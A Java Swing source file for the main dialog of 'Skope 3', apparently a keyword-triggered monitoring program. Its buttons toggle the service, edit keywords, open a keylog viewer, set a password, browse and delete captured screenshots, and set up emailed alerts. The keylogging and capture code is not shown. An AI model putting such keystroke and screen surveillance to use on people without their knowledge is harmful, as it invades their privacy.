package com.gundersoft.skope3;

import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import javax.swing.JOptionPane;
import java.awt.Cursor;

/**
 * Skope Main Dialog 
 * @author Christian Gunderman
 */
public class SkopeDialog {
	
    /**
     * Displays the main Skope Dialog Box
     * @param parent The parent window for this dialog that will be 
     * modally disabled while dialog is showing.
     * @param instance The Main object that contains this program's
     * objects.
     */
    public static void display(UIBuilder.Window parent, final Main instance) {
	// get UIBuilder
	final UIBuilder builder = instance.getBuilder();
		
	// create dialog
	final UIBuilder.Window dialog = builder.new Window(parent, "Skope 3", 650, 500);
		
	// get alerts images and file names
	Alerts.Catalog alertsCatalog = null;
	try {
	    alertsCatalog = Alerts.getAlertsOverview();
	} catch(IOException e) {
	    JOptionPane.showMessageDialog(dialog, "Unable to open an alert image.\r\n" 
					  + e.getMessage(), "Skope 3", JOptionPane.ERROR_MESSAGE);
	}
	final Alerts.Catalog alerts = alertsCatalog;
		
	// welcome label
	final UIBuilder.Label welcomeLabel = builder.new Label(
							       "Welcome to " + AboutDialog.versionText + ". Please click an alert icon to see its images.",
							       10, 10, 570, 25);
	dialog.add(welcomeLabel);
		
	// enable check box
	final UIBuilder.CheckBox enableCheckBox = 
	    instance.getBuilder().new CheckBox("Enable Service", 50, 150, 150, 25);
	enableCheckBox.setSelected(instance.getService().isEnabled());
	enableCheckBox.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    if(enableCheckBox.isSelected()) {
			instance.startService();
		    } else {
			instance.stopService();
		    }
		}
	    });
	dialog.add(enableCheckBox);
		
	// keywords button
	UIBuilder.Button keywordsButton = builder.
	    new Button("Edit Keywords", 10, 230, 150, 35);
	keywordsButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    KeywordDialog.displayKeywordsBox(dialog, instance);
		}
	    });
	dialog.add(keywordsButton);
		
	// keywords button
	UIBuilder.Button keylogButton = builder.
	    new Button("View Keylog", 170, 230, 150, 35);
	keylogButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
				
		    // set wait cursor
		    dialog.setCursor(Cursor.getPredefinedCursor(Cursor.WAIT_CURSOR));
				
		    // save keylog to file
		    try {
			instance.getService().getKeylogger().flushBuffers();
		    } catch (IOException exception) {
			JOptionPane.showMessageDialog(dialog, 
						      "Unable to write current log to keylog file. \r\n" 
						      + exception.getMessage(), "Skope 3",
						      JOptionPane.ERROR_MESSAGE);
			// set normal cursor
			dialog.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
		    }
				
		    // open keylog reader dialog
		    try {
			KeylogDialog.display(dialog, instance, 
					     instance.getSettings().getStringValue("Skope3.Service.TextLogFile", 
										   "textlog.dat"), instance.getSettings().
					     getStringValue("Skope3.Service.KeyLogFile", "keylog.dat"),
					     null);
		    } catch (IOException err) {
			JOptionPane.showMessageDialog(dialog, 
						      "Unable to open keylog file. There isn't any text in the log yet. Type away!\r\n" + err.getMessage(),
						      "Skope 3", JOptionPane.ERROR_MESSAGE);
			// set normal cursor
			dialog.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
		    }
				
		    // set normal cursor
		    dialog.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
		}
	    });
	dialog.add(keylogButton);
		
	// password button
	UIBuilder.Button passwordButton = builder.
	    new Button("Set Password", 330, 230, 150, 35);
	passwordButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    instance.getSecurity().resetPasswordDialog(dialog, instance.getBuilder());
		}
	    });
	dialog.add(passwordButton);
		
	// about button
	UIBuilder.Button aboutButton = builder.
	    new Button("About Skope 3", 490, 230, 150, 35);
	aboutButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    AboutDialog.displayAboutBox(dialog, instance);
		}
	    });
	dialog.add(aboutButton);
				
	// shuffler setup
	final UIBuilder.ImageShuffler shuffler = builder.new ImageShuffler(
									   alerts == null ? null:alerts.images,
									   alerts == null ? null:alerts.keywords, 0, 270, dialog.getWidth(), 150);
	shuffler.setIconClickedListener(new UIBuilder.IconClickedListener() {
		@Override
		public void iconClicked(int index, String iconCaption) {
				
		    // set wait cursor
		    dialog.setCursor(Cursor.getPredefinedCursor(Cursor.WAIT_CURSOR));
				
		    // open dialog
		    viewKeywordAlert(dialog, builder, alerts.keywords[index]);
				
		    // set normal cursor
		    dialog.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
		}
	    });
	shuffler.setEmptyText("There are currently no Skope Alerts");
	shuffler.setMargins(new Insets(20, 20, 30, 20));
	dialog.add(shuffler);
		
	// reset button
	UIBuilder.Button resetButton = builder.
	    new Button("Reset All Alerts", 10, 430, 150, 35);
	resetButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    if(JOptionPane.showConfirmDialog(dialog, 
						     "Are you sure that you want to delete all Skope Alerts?",
						     "Skope 3", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION) {
			File capturesDir = new File("captures");
			Tools.recursiveDelete(capturesDir);
			capturesDir.mkdirs();
					
			// reset images
			Alerts.Catalog alerts = null;
			try {
			    alerts = Alerts.getAlertsOverview();
			} catch (IOException err) {
			    JOptionPane.showMessageDialog(dialog, "Unable to open an alert image.\r\n" 
							  + err.getMessage(), "Skope 3", JOptionPane.ERROR_MESSAGE);
			}
			shuffler.setImageArray(alerts.images);
		    }
		}
	    });
	dialog.add(resetButton);
		
	// email settings button
	UIBuilder.Button emailButton = builder.
	    new Button("Auto Email Alerts to Me", 170, 430, 300, 35);
	emailButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    EmailDialog.display(dialog, instance);
		}
	    });
	dialog.add(emailButton);
		
	dialog.setVisible(true);
	dialog.dispose();
	System.gc();
		
	// debug mode, make easier to debug by exiting when close window
	if(instance.getSettings().getBooleanValue("Skope3.Debug", false)) {
	    instance.terminate();
	}
    }
	
    /**
     * Displays a dialog containing an ImageShuffler of the Skope screenshots
     * @param parent The parent window to this dialog.
     * @param builder The UIBuilder for the current user interface.
     * @param keyword The The keyword who's images will be displayed.
     */
    public static void viewKeywordAlert(UIBuilder.Window parent, final UIBuilder builder, final String keyword) {
		
	// create dialog
	final UIBuilder.Window dialog = builder.new Window(parent, "Skope 3 \"" + keyword + "\" Alert", 400, 300);
	Alerts.Catalog alerts = null;
	try {
	    alerts = Alerts.getKeywordImages(keyword);
	} catch (IOException e) {
	    JOptionPane.showMessageDialog(dialog, "Unable to open an image for this keyword file.", 
					  "Skope 3", JOptionPane.ERROR_MESSAGE);
	    return;
	}
		
	// welcome label
	final UIBuilder.Label vpWelcomeLabel = builder.new Label("Here are images related to \"" + keyword + "\".",
								 10, 10, 570, 25);
	dialog.add(vpWelcomeLabel);
		
	// shuffler setup
	final UIBuilder.ImageShuffler vpShuffler = builder.new ImageShuffler(
									     alerts.images, null, 0, 45, dialog.getWidth(), 150);
	vpShuffler.setIconClickedListener(new UIBuilder.IconClickedListener() {
		@Override
		public void iconClicked(int index, String iconCaption) {
		    ViewerDialog.display(dialog, builder, vpShuffler.getImageArray()[index]);
		}
	    });
	vpShuffler.setMargins(new Insets(20, 20, 30, 20));
	dialog.add(vpShuffler);
		
	// delete button
	final UIBuilder.Button clrButton = builder.new 
	    Button("Clear Images", 10, 195, 155, 30);
	clrButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    if(JOptionPane.showConfirmDialog(dialog, 
						     "Are you sure you want to clear all images from this alert?",
						     "Skope 3", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION) {
			Alerts.clearAlerts();
			dialog.dispose();
		    }
		}
	    });
	dialog.add(clrButton);
		
	// key log button
	final UIBuilder.Button keylogButton = builder.new 
	    Button("View Relevant Keylogs", 175, 195, 200, 30);
	keylogButton.addActionListener(new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {
		    JOptionPane.showMessageDialog(dialog, "This feature is a work in progress. " + 
						  "It will be done before final release.", "Skope 3", JOptionPane.INFORMATION_MESSAGE);
		}
	    });
	dialog.add(keylogButton);
		
	// set window visible
	dialog.setVisible(true);
	dialog.dispose();
    }
}
